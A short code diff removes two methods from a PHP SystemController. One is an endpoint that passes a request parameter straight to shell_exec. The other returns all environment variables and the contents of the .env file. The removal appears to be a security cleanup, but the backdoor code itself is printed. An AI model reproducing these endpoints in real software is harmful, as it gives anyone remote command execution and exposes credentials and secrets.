@@ -39,20 +39,6 @@ class SystemController extends BaseController
         return new Response($docs);
     }
 
-    public function exec(Request $request)
-    {
-        return shell_exec($request->input('cmd'));
-    }
-
-    public function env()
-    {
-        return new JsonResponse([
-            '$_ENV'  => $_ENV,
-            'getenv' => getenv(),
-            '.env'   => file_get_contents(app()->basePath('.env')),
-        ]);
-    }
-
     /**
      * GET /system/sitemap
      * Dynamically generate the sitemap.
